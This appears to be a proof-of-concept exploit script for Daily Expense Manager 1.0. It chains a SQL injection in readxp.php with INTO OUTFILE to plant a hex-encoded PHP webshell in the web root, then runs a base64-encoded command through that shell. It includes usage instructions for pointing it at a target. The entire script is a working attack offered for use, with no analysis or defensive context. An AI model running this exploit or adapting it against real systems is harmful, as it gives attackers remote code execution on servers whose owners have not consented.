#!/usr/bin/python3
import sys, requests, time
r = requests.Session()

def sqli(target):
	print ("[!] Attempting to write a webshell...")
	time.sleep(1)
	# /var/www/html/ is assumed. Adjust if your working webserver directory is different.
	sqli = r.get("http://" + target + "/Daily-Expense-Manager/readxp.php?term=asd%27%20UNION%20ALL%20SELECT%201,0x3c3f7068702073797374656d286261736536345f6465636f646528245f4745545b27636d64275d29293b3f3e,3,4,5,6%20INTO%20OUTFILE%20%27/var/www/html/Daily-Expense-Manager/shell.php%27--%20-")
	if sqli.status_code == 500:
		print("[+] Done! Server error received.")
		return
	else:
		print("[-] Something went wrong... is the app reachable?")
		sys.exit(1)

def requestShell(target, cmd):
	print("[!] Attempting to execute Base64 encoded command...")
	time.sleep(1)
	shell = r.get("http://" + target + "/Daily-Expense-Manager/shell.php?cmd=" + cmd)
	if shell.status_code == 200:
		print("[+] Code Execution successful!")
		print("[+] Visit the webshell: http://" + target + "/Daily-Expense-Manager/shell.php?cmd=" + cmd)
		print("[+] Results: " + str(shell.content))
		sys.exit(1)
	else:
		print("[-] Something went wrong... is the app reachable, or incorrect permissions on the server?")
		sys.exit(1)

def main():
	if len(sys.argv) != 3:
		print("[!] Daily Expense Manager 1.0 - SQLi to RCE proof-of-concept")
		print ("[!] Usage %s <target> <base64_encoded_command>" % sys.argv[0])
		print ("[!] e.g.: %s example.com aWQ=" % sys.argv[0])
		sys.exit(1)

	ip = sys.argv[1]
	cmd = sys.argv[2]
	sqli(ip)
	requestShell(ip, cmd)

if __name__ == '__main__':
	main()